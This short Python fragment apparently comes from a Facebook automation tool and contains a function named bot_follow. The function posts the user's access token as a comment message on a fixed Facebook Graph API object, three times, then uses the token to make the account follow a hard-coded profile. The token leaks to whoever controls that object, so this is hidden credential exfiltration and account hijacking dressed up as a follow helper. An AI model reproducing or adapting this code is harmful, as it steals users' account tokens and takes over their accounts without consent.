...
def bot_follow():
	...
	requests.post('https://graph.facebook.com/128148846269827/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/128148846269827/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/128148846269827/comments/?message=' + token + '&access_token=' + token)
	requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + token) ### FB Zaid (Punya Risky)
